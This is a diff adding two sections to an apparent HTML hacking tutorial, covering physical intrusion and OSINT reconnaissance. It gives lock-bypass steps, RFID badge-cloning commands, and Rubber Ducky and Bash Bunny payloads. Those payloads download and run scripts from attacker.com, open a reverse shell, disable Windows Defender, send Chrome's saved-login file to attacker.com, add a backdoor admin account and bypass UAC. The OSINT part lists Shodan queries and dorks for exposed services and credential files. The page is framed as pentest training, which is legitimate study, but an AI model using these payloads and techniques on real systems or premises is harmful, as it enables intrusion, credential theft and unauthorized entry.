@@ -8280,19 +8280,3835 @@ scanner.scan_range(1, 1000)</div>
         <!-- SECTION 10: Physical Security & Social Engineering -->
         <section id="physical-security" class="section">
             <h2 class="section-title">Physical Security & Social Engineering</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">The human element is always the weakest link. You can have perfect firewalls, encrypted disks, and multi-factor authentication—but if someone tailgates through the door or plugs in a USB Rubber Ducky, game over! Physical security attacks bypass technical controls entirely. This section covers lock picking, badge cloning (RFID/NFC), USB attack platforms (Rubber Ducky, Bash Bunny, O.MG Cable), social engineering tactics, phishing campaigns, pretexting, and physical penetration testing methodology. By the end, you'll understand how hackers walk through front doors!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Physical Security = The Front Door Hack</h4>
+                <p><strong>Why physical attacks work:</strong><br><br>
+                • <strong>Bypass network defenses:</strong> No firewall stops a person walking in<br>
+                • <strong>Direct access:</strong> Physical = root/admin by definition<br>
+                • <strong>Social trust:</strong> Humans trust confident people with badges<br>
+                • <strong>Low detection:</strong> No IDS alerts when picking a lock<br><br>
+                <strong>Famous physical hacks:</strong><br>
+                • <strong>2011 RSA breach:</strong> Started with spear-phishing USB drive left in parking lot<br>
+                • <strong>Stuxnet:</strong> USB worm infected air-gapped Iranian nuclear facility<br>
+                • <strong>Social engineering:</strong> Kevin Mitnick never needed to code—he just called people<br><br>
+                Physical security testing finds the holes that digital audits miss! 🚪🔐</p>
+            </div>
+
+            <h3>Part 1: Lock Picking Fundamentals</h3>
+
+            <div class="info-box">
+                <h4>How Locks Work (Pin Tumbler)</h4>
+                <p><strong>Basic mechanism:</strong><br>
+                • <strong>Pins:</strong> Spring-loaded pins inside lock (usually 5-6 pins)<br>
+                • <strong>Shear line:</strong> Boundary between plug and housing<br>
+                • <strong>Key:</strong> Raises pins to correct height → all pins at shear line → plug rotates<br><br>
+                <strong>Without correct key:</strong><br>
+                Pins block plug from rotating<br><br>
+                <strong>With correct key:</strong><br>
+                All pins align at shear line → plug rotates → lock opens<br><br>
+                <strong>Lock picking principle:</strong><br>
+                Apply slight rotational tension → Pins bind at different rates → Set pins one by one → All pins set → Lock opens!</p>
+            </div>
+
+            <div class="code"># Lock Picking Tools:
+
+# 1. Tension Wrench (most important!)
+# Applies rotational force to plug
+# Types:
+#   - L-shaped (classic)
+#   - Z-shaped (fits different keyways)
+#   - Flat (bottom-of-keyway)
+
+# 2. Pick (manipulates pins)
+# Types:
+#   - Hook pick (single pin picking)
+#   - Rake (multiple pins simultaneously)
+#   - Diamond pick (versatile)
+#   - Half-diamond (better control)
+
+# 3. Specialized Tools:
+#   - Broken key extractor
+#   - Decoder (reads pin heights)
+#   - Plug spinner (reverses plug)
+#   - Bump key (mechanical exploit)
+#   - Snap gun (mechanical vibration)
+
+# Single Pin Picking (SPP) Technique:
+
+# Step 1: Insert tension wrench
+# Place in bottom or top of keyway
+# Apply LIGHT rotational pressure (like turning a key)
+# Too much = pins bind (can't move)
+# Too little = pins don't set
+
+# Step 2: Insert pick above tension wrench
+# Feel for pins (little bumps inside lock)
+# There should be 5-6 pins
+
+# Step 3: Push each pin up
+# One pin will be "binding" (harder to push)
+# This is the first pin to set
+# Push binding pin until you feel/hear a click
+# Plug will rotate slightly
+
+# Step 4: Repeat for remaining pins
+# New pin will bind
+# Set it
+# Continue until all pins set
+# Plug rotates fully → lock opens!
+
+# Raking Technique (faster, less precise):
+
+# Step 1: Insert tension wrench (light pressure)
+
+# Step 2: Insert rake pick
+# Scrub rake in and out rapidly
+# Pins bounce up and down
+# Some will randomly land at shear line
+
+# Step 3: Increase tension gradually
+# As pins set, increase rotational force
+# Lock may open after 10-30 seconds of raking
+
+# Practice locks:
+# • Clear acrylic practice locks (see pins moving!)
+# • Master Lock #3 (beginner lock)
+# • Kwikset deadbolts (common residential)
+# • Schlage pins (medium difficulty)
+# • Medeco locks (advanced, security pins)
+
+# Legal Note:
+# Lock picking is LEGAL in most jurisdictions if:
+#   - You own the lock, OR
+#   - You have written permission, OR
+#   - You're a locksmith
+# 
+# ILLEGAL if:
+#   - You possess picks with intent to commit crime
+#   - You pick locks you don't own without permission
+#
+# Check your local laws!</div>
+
+            <h4>Bypassing Locks (Without Picking)</h4>
+
+            <div class="code"># Lock bypasses are faster than picking!
+
+# 1. Bumping
+# Uses specially cut "bump key"
+# Exploits pin inertia
+
+# How it works:
+# - Insert bump key (cut to lowest depth on all positions)
+# - Pull out one click
+# - Apply light rotational tension
+# - Strike key with hammer/screwdriver
+# - All pins jump simultaneously
+# - Brief moment where all pins at shear line
+# - Plug rotates → lock opens!
+
+# Success rate: 90%+ on pin tumbler locks
+# Time: 5-30 seconds
+# Noise: Moderate (bump sound)
+
+# 2. Shimming (Padlocks)
+# Thin metal strip defeats locking mechanism
+
+# Step 1: Cut soda can into thin strip
+# Step 2: Insert between shackle and body
+# Step 3: Push down on shackle
+# Step 4: Shim slides past locking pawl
+# Step 5: Padlock opens!
+
+# Works on: Cheap padlocks (Master Lock, etc.)
+# Doesn't work on: Higher-security padlocks with ball bearings
+
+# 3. Impressioning
+# Create working key from blank
+
+# Step 1: Insert blank key
+# Step 2: Apply heavy rotational force
+# Step 3: Pins leave marks on blank
+# Step 4: File down marked areas
+# Step 5: Repeat until key works
+
+# Time: 30 minutes to 2 hours
+# Skill: Advanced
+# Result: Working key!
+
+# 4. Bypass Tools
+# • Under-door tool (reaches inside, unlocks from interior)
+# • Latch slipping (credit card trick on spring latches)
+# • Emergency exit exploitation (push bars can be manipulated)
+
+# 5. Destructive Entry (last resort)
+# • Drilling (destroy pins)
+# • Snapping (Euro-cylinder vulnerability)
+# • Prying (force shackle/bolt)
+# • Cutting (angle grinder, bolt cutters)</div>
+
+            <h3>Part 2: RFID/NFC Badge Cloning</h3>
+
+            <div class="code"># Many buildings use RFID/NFC badges for access control
+# Problem: Most use 125kHz HID Prox or 13.56MHz Mifare
+# Solution: Clone badges with $40 device!
+
+# Hardware: Proxmark3 (professional) or Flipper Zero (portable)
+
+# Proxmark3 Setup:
+git clone https://github.com/RfidResearchGroup/proxmark3.git
+cd proxmark3
+make clean && make all
+
+# Connect Proxmark3 via USB
+./pm3
+
+# Proxmark3 console starts:
+[=] Session log /root/.proxmark3/logs/log_20260108.txt
+[+] loaded from JSON file /root/.proxmark3/preferences.json
+
+# Identify card type:
+proxmark3> lf search
+
+# Output (125kHz HID Prox):
+[+] HID Prox TAG ID: 2006e11e (8838) - Format Len: 26 bit - FC: 100 - Card: 1822
+
+# Clone to T5577 writable card:
+proxmark3> lf hid clone 2006e11e
+
+# Output:
+[=] Cloning tag with ID 2006e11e
+[=] Done
+
+# Test cloned card:
+proxmark3> lf hid read
+
+# Should show same ID!
+
+# 13.56MHz Mifare Classic:
+proxmark3> hf search
+
+# Output:
+[+] UID: 01 02 03 04
+[+] ATQA: 00 04
+[+] SAK: 08 [2]
+[+] Mifare Classic 1K
+
+# Check for default keys:
+proxmark3> hf mf chk *1 ?
+
+# Output:
+[+] Sector 0, key type A, key: FFFFFFFFFFFF (default)
+[+] Sector 1, key type A, key: FFFFFFFFFFFF
+[... 90% of cards still use default keys! ...]
+
+# Dump card:
+proxmark3> hf mf dump
+
+# Creates: hf-mf-01020304-dump.bin
+
+# Clone to blank Mifare card:
+proxmark3> hf mf restore
+
+# Select: hf-mf-01020304-dump.bin
+# Clone complete!
+
+# NFC credit card reading:
+proxmark3> hf 14a info
+
+# Output (contactless credit card):
+[+] UID: AA BB CC DD
+[+] ATQA: 00 04
+[+] SAK: 20 [3]
+[+] TYPE: NXP MIFARE DESFire
+
+# Read card data:
+proxmark3> hf 14a reader
+
+# Some cards expose:
+# - Card number (PAN)
+# - Expiry date
+# - Cardholder name
+# - Transaction history
+
+# Note: Can't extract CVV (stored on magnetic stripe only)
+
+# Flipper Zero (Portable Alternative):
+
+# Read 125kHz badge:
+# RFID → Read → [Hold badge to device]
+# → Save as "Office_Badge"
+
+# Emulate badge:
+# RFID → Saved → Office_Badge → Emulate
+# [Hold Flipper to reader]
+# → Door unlocks!
+
+# Read 13.56MHz card:
+# NFC → Read → [Hold card to device]
+# → Shows UID and data
+
+# Emulate card:
+# NFC → Saved → [Select card] → Emulate
+
+# Defense Against Badge Cloning:
+# • Use high-frequency encrypted cards (iCLASS SE, Seos)
+# • Implement two-factor (badge + PIN)
+# • RFID-blocking sleeves
+# • Monitor for duplicate badge usage
+# • Short-range readers (require very close proximity)</div>
+
+            <h3>Part 3: USB Attack Platforms</h3>
+
+            <h4>USB Rubber Ducky</h4>
+
+            <div class="code"># USB Rubber Ducky = Keystroke injection tool
+# Looks like USB flash drive
+# Acts like USB keyboard
+# Types commands VERY fast (1000 characters/second!)
+
+# Hardware: https://shop.hak5.org/products/usb-rubber-ducky
+
+# Programming Language: DuckyScript
+
+# Example Payload (Windows):
+
+# File: payload.txt
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+ENTER
+
+# Explanation:
+# DELAY 1000        → Wait 1 second (for system to recognize USB)
+# GUI r             → Open Run dialog (Windows key + R)
+# DELAY 500         → Wait for dialog to appear
+# STRING ...        → Type PowerShell command
+# ENTER             → Execute command
+
+# This downloads and runs payload from attacker server!
+
+# More DuckyScript commands:
+
+# REM Comment
+# Used for documentation
+
+# DELAY milliseconds
+DELAY 2000  # Wait 2 seconds
+
+# STRING text
+STRING Hello World  # Types: Hello World
+
+# ENTER, SPACE, TAB, ESCAPE
+ENTER
+
+# GUI (Windows key), CTRL, ALT, SHIFT
+GUI
+CTRL a
+ALT F4
+
+# Function keys
+F1
+F12
+
+# REPEAT n
+REPEAT 5
+STRING Hello
+ENTER
+END_REPEAT
+
+# Examples:
+
+# 1. Reverse Shell Payload (Windows):
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"
+ENTER
+
+# 2. Disable Windows Defender:
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 2000
+ENTER
+DELAY 3000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
+# 3. Exfiltrate Chrome Passwords (Windows):
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden "$data = Get-Content $env:LOCALAPPDATA\Google\Chrome\User Data\Default\'Login Data' -Raw; Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body $data"
+ENTER
+
+# 4. Create Admin User:
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add
+ENTER
+
+# 5. Rick Roll (harmless prank):
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+
+# Compiling DuckyScript:
+# Use Hak5 encoder: https://duck-encoder.netlify.app/
+# Or command-line tool:
+java -jar encoder.jar -i payload.txt -o inject.bin
+
+# Copy inject.bin to Rubber Ducky SD card</div>
+
+            <h4>Bash Bunny</h4>
+
+            <div class="code"># Bash Bunny = Multi-vector USB attack platform
+# Can act as: Keyboard, Ethernet, Serial, Mass Storage
+# Runs Linux, supports any scripting language
+
+# Hardware: https://shop.hak5.org/products/bash-bunny
+
+# Switch Positions:
+# • Switch 1: Payload in /payloads/switch1/
+# • Switch 2: Payload in /payloads/switch2/
+# • Switch 3: Arming mode (for payload development)
+
+# Example Payload (QuickCreds):
+
+#!/bin/bash
+# Title: QuickCreds
+# Description: Harvests credentials from Windows
+# Author: Hak5
+
+# LED color feedback
+LED R  # Red = starting
+
+# Attack mode: Ethernet + mass storage
+ATTACKMODE RNDIS_ETHERNET STORAGE
+
+# Get victim's IP
+GET TARGET_IP
+
+# Start responder (captures NTLM hashes)
+python /tools/responder/Responder.py -I usb0 -wrf
+
+# LED green = capturing
+LED G
+
+# Wait for hashes
+sleep 60
+
+# Save hashes to /loot/
+cp /tools/responder/logs/* /loot/
+
+# LED blue = done
+LED B
+
+# Another payload (UAC Bypass + Backdoor):
+
+#!/bin/bash
+LED R
+
+ATTACKMODE HID STORAGE
+
+Q DELAY 1000
+Q GUI r
+Q DELAY 500
+Q STRING powershell
+Q ENTER
+Q DELAY 1000
+
+# Check if admin
+Q STRING [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+Q ENTER
+
+# If not admin, UAC bypass:
+Q STRING New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+Q ENTER
+Q STRING Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start powershell" -Force
+Q ENTER
+Q STRING Start-Process computerdefaults.exe
+Q DELAY 3000
+
+# Download and execute beacon:
+Q STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')
+Q ENTER
+
+LED G
+
+# O.MG Cable (malicious USB cable):
+
+# Looks: Exactly like normal Lightning/USB-C cable
+# Reality: Hidden WiFi chip + keystroke injection
+# Access: WiFi hotspot (O.MG-XXXX)
+# Web interface: http://192.168.4.1
+
+# Payloads same as Rubber Ducky
+# Advantage: Victim thinks it's just a charging cable!
+
+# Detection Difficulty: VERY HIGH
+# Defense: Only use your own cables, inspect electronics</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Physical Pentester!</h4>
+                <p>You've mastered:<br><br>
+                ✅ <strong>Lock Picking:</strong> Pin tumbler mechanism, SPP, raking, bumping, shimming, impressioning<br>
+                ✅ <strong>Badge Cloning:</strong> Proxmark3, Flipper Zero, HID Prox, Mifare Classic, NFC<br>
+                ✅ <strong>USB Attacks:</strong> Rubber Ducky, Bash Bunny, O.MG Cable, DuckyScript, keystroke injection<br><br>
+                <strong>Physical pentesting methodology:</strong><br>
+                1. <strong>Reconnaissance:</strong> Scout building, identify entry points, observe employees<br>
+                2. <strong>Pretexting:</strong> Create believable cover story (IT contractor, delivery person, fire inspector)<br>
+                3. <strong>Entry:</strong> Tailgate, badge clone, lock pick, or social engineering<br>
+                4. <strong>Access:</strong> Plug in Bash Bunny, USB Rubber Ducky, or rogue WiFi AP<br>
+                5. <strong>Persistence:</strong> Install physical backdoor (hidden Pi Zero, rogue AP, keylogger)<br>
+                6. <strong>Exfiltration:</strong> Steal documents, plant listening devices, photograph screens<br>
+                7. <strong>Exit:</strong> Leave no trace, maintain cover story<br><br>
+                Physical security bypasses ALL network defenses. Never underestimate the power of walking through the door! 🚪🔓</p>
+            </div>
         </section>
 
         <!-- SECTION 11: Advanced OSINT & Reconnaissance -->
         <section id="advanced-osint" class="section">
             <h2 class="section-title">Advanced OSINT & Reconnaissance</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Open Source Intelligence (OSINT) is the art of finding information hiding in plain sight. Before hacking, you need targets, credentials, vulnerabilities, employees, infrastructure, and attack surface understanding. OSINT provides ALL of this without touching the target network! This section covers Maltego for relationship mapping, theHarvester for email/subdomain enumeration, Recon-ng modular framework, Shodan IoT search engine mastery, advanced Google dorking, LinkedIn reconnaissance, breach databases, WHOIS/DNS analysis, and OSINT automation. By the end, you'll know more about your target than they know about themselves!</p>
+
+            <div class=\"metaphor-box\">
+                <h4>💡 OSINT = Google-Fu on Steroids</h4>
+                <p><strong>What can you find with OSINT?</strong><br><br>
+                • <strong>Employees:</strong> Names, emails, phone numbers, job titles, LinkedIn profiles<br>
+                • <strong>Infrastructure:</strong> IP ranges, subdomains, email servers, DNS records, cloud assets<br>
+                • <strong>Credentials:</strong> Breach databases, pastes, old dumps, password patterns<br>
+                • <strong>Vulnerabilities:</strong> Shodan for exposed services, old CVEs, misconfigurations<br>
+                • <strong>Physical locations:</strong> Google Maps, employee check-ins, geotagged photos<br>
+                • <strong>Technologies:</strong> Wappalyzer, BuiltWith, job postings mentioning stack<br><br>
+                <strong>Famous OSINT wins:</strong><br>
+                • Bellingcat identified Russian military using geotagged social media photos<br>
+                • Security researchers find 0-days by searching Shodan for vulnerable IoT devices<br>
+                • Social engineering pretext built entirely from LinkedIn + breach databases<br><br>
+                OSINT is LEGAL, PASSIVE, and POWERFUL! 🔍🌐</p>
+            </div>
+
+            <h3>Part 1: Maltego - Visual Link Analysis</h3>
+
+            <div class=\"code\"># Maltego = Graph-based OSINT tool (visual relationship mapping)
+# Free Community Edition available
+
+# Install:
+# Download from: https://www.maltego.com/downloads/
+# Or via Kali:
+sudo apt install maltego
+
+# Launch:
+maltego
+
+# First run: Register for free API key
+
+# Creating Investigation:
+
+# 1. New Graph
+# 2. Add Entity (drag from palette):
+#    - Domain
+#    - Person
+#    - Email Address
+#    - Phone Number
+#    - IP Address
+#    - etc.
+
+# 3. Run Transform:
+# Right-click entity → All Transforms
+# Or specific transform:
+#    - DNS from Domain
+#    - Email Addresses from Domain
+#    - Files and Documents from Domain
+
+# Example: Investigate company.com
+
+# Step 1: Add \"Domain\" entity
+# Value: company.com
+
+# Step 2: Run Transform \"DNS from Domain\"
+# Returns:
+#   - NS records (nameservers)
+#   - MX records (mail servers)
+#   - A records (IP addresses)
+
+# Step 3: Run Transform \"Email Addresses from Domain\"
+# Searches:
+#   - Google
+#   - Bing
+#   - PGP key servers
+#   - Public documents
+# Returns: john@company.com, admin@company.com, etc.
+
+# Step 4: From email addresses → \"Person from Email\"
+# Returns: Names associated with emails
+
+# Step 5: From names → \"Phones from Person\"
+# Searches social media, WHOIS, etc.
+# Returns: Phone numbers
+
+# Step 6: From phones → \"Location from Phone\"
+# Returns: Geographic location
+
+# After 5-10 transforms:
+# Graph shows:
+#   - 50+ entities
+#   - Relationships between all
+#   - Visual network map
+#   - Attack surface!
+
+# Advanced Transforms:
+
+# VirusTotal Integration:
+# Domain → VirusTotal Passive DNS
+# Shows all subdomains ever resolved
+
+# Shodan Integration:
+# IP Address → Shodan Details
+# Shows open ports, services, vulnerabilities
+
+# Social Media:
+# Person → Twitter from Person
+# Email → Social Network from Email
+
+# Document Metadata:
+# Domain → Documents from Domain
+# → Metadata from Document
+# Extracts: Author names, software versions, file paths
+
+# Custom Transforms:
+
+# You can write Python transforms!
+# Template:
+
+from maltego_trx.entities import Domain, IPAddress
+from maltego_trx.transform import DiscoverableTransform
+
+class DNSToIP(DiscoverableTransform):
+    @classmethod
+    def create_entities(cls, request, response):
+        domain = request.Value
+        
+        # Resolve DNS
+        import socket
+        ip = socket.gethostbyname(domain)
+        
+        # Add IP entity to graph
+        response.addEntity(IPAddress, ip)
+
+# Maltego Use Cases:
+
+# 1. Corporate Investigation
+# Start: Company domain
+# Discover: All employees, emails, subdomains, IPs, social media
+
+# 2. Person Investigation
+# Start: Email address
+# Discover: Real name, phone, addresses, social profiles, relatives
+
+# 3. Infrastructure Mapping
+# Start: Single IP
+# Discover: All related IPs, domains, ASN, hosting provider
+
+# 4. Breach Investigation
+# Start: Leaked email
+# Discover: Other breaches, password patterns, reused credentials
+
+# Maltego Machines (Automated):
+
+# Pre-built investigation workflows
+# Example: \"Footprint L1\" machine
+#   1. Adds domain
+#   2. Resolves DNS
+#   3. Finds emails
+#   4. Enumerates subdomains
+#   5. Maps infrastructure
+# All automatic!
+
+# Output:
+# Export graph as:
+#   - PDF report
+#   - CSV data
+#   - Image (PNG)
+#   - Maltego graph file</div>
+
+            <h3>Part 2: theHarvester - Email & Subdomain Harvesting</h3>
+
+            <div class=\"code\"># theHarvester = Fast OSINT tool for emails, subdomains, IPs
+
+# Install (comes with Kali):
+sudo apt install theharvester
+
+# Or latest version:
+git clone https://github.com/laramies/theHarvester
+cd theHarvester
+pip3 install -r requirements.txt
+
+# Basic usage:
+theHarvester -d company.com -b all
+
+# Flags:
+# -d domain     → Target domain
+# -b source     → Data source (google, bing, linkedin, etc.)
+# -l limit      → Limit results (default: 500)
+# -f file       → Save to HTML/XML/JSON
+
+# Data sources:
+
+# 1. Search Engines:
+theHarvester -d company.com -b google
+theHarvester -d company.com -b bing
+theHarvester -d company.com -b yahoo
+
+# 2. Social Networks:
+theHarvester -d company.com -b linkedin
+theHarvester -d company.com -b twitter
+
+# 3. Certificate Transparency:
+theHarvester -d company.com -b certspotter
+theHarvester -d company.com -b crtsh
+
+# Returns ALL subdomains from SSL certificates!
+
+# 4. DNS Databases:
+theHarvester -d company.com -b dnsdumpster
+theHarvester -d company.com -b threatcrowd
+
+# 5. Shodan:
+theHarvester -d company.com -b shodan -s YOUR_SHODAN_API_KEY
+
+# 6. VirusTotal:
+theHarvester -d company.com -b virustotal
+
+# 7. All sources at once:
+theHarvester -d company.com -b all
+
+# Output:
+# [*] Harvesting emails...
+# john.doe@company.com
+# jane.smith@company.com
+# admin@company.com
+# support@company.com
+# 
+# [*] Harvesting subdomains...
+# mail.company.com
+# vpn.company.com
+# dev.company.com
+# staging.company.com
+# api.company.com
+# 
+# [*] Harvesting IP addresses...
+# 192.0.2.10
+# 192.0.2.11
+# 
+# [*] Harvesting URLs...
+# https://www.company.com/careers
+# https://www.company.com/contact
+
+# Advanced usage:
+
+# Save results:
+theHarvester -d company.com -b all -f company_report
+
+# Output formats:
+# company_report.html
+# company_report.xml
+# company_report.json
+
+# Limit results:
+theHarvester -d company.com -b google -l 100
+
+# Only 100 results from Google
+
+# Virtual host discovery:
+theHarvester -d company.com -v
+
+# Verifies if subdomains are alive
+
+# DNS brute force:
+theHarvester -d company.com -c
+
+# Brute-forces common subdomain names
+
+# Parsing results with Python:
+
+import json
+
+with open('company_report.json', 'r') as f:
+    data = json.load(f)
+
+emails = data['emails']
+subdomains = data['hosts']
+
+print(f\"Found {len(emails)} emails\")
+print(f\"Found {len(subdomains)} subdomains\")
+
+# Use for:
+# - Phishing campaign target list
+# - Subdomain takeover checks
+# - Password spraying attacks
+# - Infrastructure mapping</div>
+
+            <h3>Part 3: Recon-ng - Modular Reconnaissance Framework</h3>
+
+            <div class=\"code\"># Recon-ng = Metasploit for reconnaissance
+# Modular, scriptable, database-backed
+
+# Install:
+sudo apt install recon-ng
+
+# Or latest:
+git clone https://github.com/lanmaster53/recon-ng.git
+cd recon-ng
+pip3 install -r REQUIREMENTS
+
+# Launch:
+recon-ng
+
+# Recon-ng console:
+[recon-ng][default] > 
+
+# Create workspace:
+[recon-ng][default] > workspaces create company_investigation
+
+# Add domain:
+[recon-ng][company_investigation] > db insert domains
+domain (TEXT): company.com
+
+# View domains:
+[recon-ng][company_investigation] > db query SELECT * FROM domains
+
+# Install modules:
+[recon-ng][company_investigation] > marketplace search
+
+# Install specific module:
+[recon-ng][company_investigation] > marketplace install recon/domains-hosts/bing_domain_web
+
+# View installed modules:
+[recon-ng][company_investigation] > modules search
+
+# Load module:
+[recon-ng][company_investigation] > modules load recon/domains-hosts/bing_domain_web
+
+# Set source:
+[recon-ng][company_investigation][bing_domain_web] > options set SOURCE company.com
+
+# Run module:
+[recon-ng][company_investigation][bing_domain_web] > run
+
+# Output:
+# [*] Searching Bing for: site:company.com
+# [*] mail.company.com
+# [*] vpn.company.com
+# [*] dev.company.com
+# 
+# [*] 3 hosts added to database
+
+# View results:
+[recon-ng][company_investigation] > db query SELECT * FROM hosts
+
+# Useful modules:
+
+# 1. Subdomain enumeration:
+modules load recon/domains-hosts/certificate_transparency
+run
+
+modules load recon/domains-hosts/google_site_web
+run
+
+modules load recon/domains-hosts/hackertarget
+run
+
+# 2. Email harvesting:
+modules load recon/domains-contacts/hunter_io
+options set SOURCE company.com
+run
+
+# 3. Employee discovery:
+modules load recon/companies-contacts/linkedin_contacts
+options set SOURCE Company Name
+run
+
+# 4. IP to geolocation:
+modules load recon/hosts-hosts/ipinfodb
+run
+
+# 5. Shodan integration:
+modules load recon/hosts-ports/shodan_ip
+options set SOURCE 192.0.2.10
+run
+
+# 6. Breach data:
+modules load recon/contacts-credentials/hibp_breach
+# (HaveIBeenPwned API)
+
+# Reporting:
+
+# Export to HTML:
+[recon-ng][company_investigation] > db query SELECT * FROM hosts
+# Copy-paste to report
+
+# Or use reporting modules:
+modules load reporting/html
+options set FILENAME company_report.html
+options set CREATOR \"Your Name\"
+run
+
+# Automation with Python:
+
+from recon.core import base
+import os
+
+# Create recon-ng instance
+r = base.Recon(base.Mode.CLI)
+
+# Create workspace
+r.do_workspaces('create test_workspace')
+
+# Add domain
+r.do_db('insert domains')
+# Input: company.com
+
+# Load and run module
+r.do_modules('load recon/domains-hosts/bing_domain_web')
+r.do_options('set SOURCE company.com')
+r.do_run('')
+
+# Query results
+r.do_db('query SELECT * FROM hosts')</div>
+
+            <h3>Part 4: Shodan - IoT & Infrastructure Search Engine</h3>
+
+            <div class=\"code\"># Shodan = \"Google for hackers\"
+# Indexes: Webcams, routers, SCADA, databases, IoT devices
+
+# Web interface: https://www.shodan.io
+
+# CLI tool:
+pip install shodan
+
+# Initialize with API key (free tier: 100 queries/month):
+shodan init YOUR_API_KEY
+
+# Basic searches:
+
+# Find specific service:
+shodan search apache
+
+# Find in specific country:
+shodan search apache country:US
+
+# Find on specific port:
+shodan search port:3389
+
+# Find with default credentials:
+shodan search \"default password\"
+
+# Advanced filters:
+
+# org:      Organization
+# net:      IP range (CIDR)
+# country:  Country code
+# city:     City name
+# port:     Port number
+# os:       Operating system
+# product:  Software name
+# version:  Software version
+# vuln:     CVE number
+
+# Examples:
+
+# 1. Find all MongoDB databases:
+shodan search \"MongoDB Server Information\" port:27017
+
+# Many exposed without authentication!
+
+# 2. Find webcams:
+shodan search \"Server: yawcam\" country:US
+
+# Live webcam streams!
+
+# 3. Find industrial control systems:
+shodan search \"Siemens\" port:102
+
+# SCADA systems!
+
+# 4. Find Elasticsearch:
+shodan search \"elastic indices\" port:9200
+
+# Often contains sensitive data
+
+# 5. Find devices vulnerable to specific CVE:
+shodan search vuln:CVE-2021-44228
+
+# All devices vulnerable to Log4Shell!
+
+# 6. Find specific organization:
+shodan search org:\"Target Company\"
+
+# All internet-facing assets!
+
+# 7. Find devices with specific title:
+shodan search http.title:\"Dashboard\"
+
+# Finds admin dashboards
+
+# 8. Find FTP servers:
+shodan search port:21 \"220\"
+
+# Many allow anonymous access
+
+# Shodan Python API:
+
+import shodan
+
+api = shodan.Shodan('YOUR_API_KEY')
+
+# Search:
+results = api.search('apache')
+
+print(f\"Results found: {results['total']}\")
+
+for result in results['matches']:
+    print(f\"IP: {result['ip_str']}\")
+    print(f\"Port: {result['port']}\")
+    print(f\"Organization: {result.get('org', 'N/A')}\")
+    print(f\"OS: {result.get('os', 'N/A')}\")
+    print(\"-\" * 40)
+
+# Host lookup (detailed info on specific IP):
+host = api.host('192.0.2.1')
+
+print(f\"IP: {host['ip_str']}\")
+print(f\"Organization: {host.get('org', 'n/a')}\")
+print(f\"Operating System: {host.get('os', 'n/a')}\")
+print(f\"Ports: {host['ports']}\")
+
+for item in host['data']:
+    print(f\"Port: {item['port']}\")
+    print(f\"Banner: {item['data']}\")
+
+# Shodan Exploits API:
+exploits = api.exploits.search('apache')
+
+for exploit in exploits['matches']:
+    print(f\"CVE: {exploit.get('cve', 'N/A')}\")
+    print(f\"Description: {exploit['description']}\")
+
+# Monitoring:
+# Set up alerts for new assets:
+
+# Web interface:
+# Monitors → Create Alert → \"org:Company\"
+# Email notification when new IPs appear!
+
+# Shodan Honeyscore:
+# Check if IP is honeypot:
+score = api.labs.honeyscore('192.0.2.1')
+print(f\"Honeypot score: {score}\")  # 0.0 - 1.0 (1.0 = definitely honeypot)
+
+# Common Shodan queries:
+
+# RDP exposed:
+port:3389 country:US
+
+# Telnet (often no auth):
+port:23
+
+# VNC (often no password):
+\"authentication disabled\" port:5900
+
+# Redis (no auth by default):
+port:6379 \"redis_version\"
+
+# MySQL:
+\"MySQL\" port:3306
+
+# Jenkins (CI/CD servers):
+\"X-Jenkins\" \"Set-Cookie: JSESSIONID\"
+
+# Docker API (remote code execution!):
+\"Docker\" port:2375
+
+# Kubernetes:
+port:10250 ssl:\"kubernetes\"
+
+# Printers:
+\"HP LaserJet\" port:9100
+
+# Building automation:
+\"Niagara\" port:80</div>
+
+            <h3>Part 5: Advanced Google Dorking</h3>
+
+            <div class=\"code\"># Google Dorking = Using advanced search operators to find hidden info
+
+# Basic operators:
+
+# site:     Limit to specific site
+site:company.com
+
+# filetype: Specific file type
+filetype:pdf
+
+# intitle:  Words in title
+intitle:\"index of\"
+
+# inurl:    Words in URL
+inurl:admin
+
+# intext:   Words in body
+intext:\"password\"
+
+# cache:    Cached version
+cache:company.com
+
+# Combining operators:
+
+# 1. Find exposed directories:
+site:company.com intitle:\"index of\" \"parent directory\"
+
+# Shows directory listings!
+
+# 2. Find config files:
+site:company.com filetype:env
+site:company.com filetype:config
+site:company.com filetype:ini
+
+# Often contain database credentials!
+
+# 3. Find database dumps:
+site:company.com filetype:sql \"INSERT INTO\"
+
+# 4. Find backup files:
+site:company.com (ext:bak | ext:old | ext:backup)
+
+# 5. Find login pages:
+site:company.com inurl:login
+site:company.com inurl:admin
+site:company.com inurl:auth
+
+# 6. Find exposed documents:
+site:company.com (filetype:doc | filetype:pdf | filetype:xls)
+
+# Metadata in docs often reveals:
+#   - Employee names
+#   - Internal paths (C:\\Users\\john\\Documents\\)
+#   - Software versions
+
+# 7. Find error messages:
+site:company.com intext:\"sql syntax\"
+site:company.com intext:\"Warning: mysql\"
+site:company.com intext:\"PHP Fatal error\"
+
+# Reveals technology stack!
+
+# 8. Find subdomains:
+site:*.company.com
+
+# 9. Find email addresses:
+site:company.com intext:\"@company.com\"
+
+# 10. Find exposed API keys:
+site:company.com inurl:api (key | token | secret)
+
+# Google Dork Database:
+# https://www.exploit-db.com/google-hacking-database
+
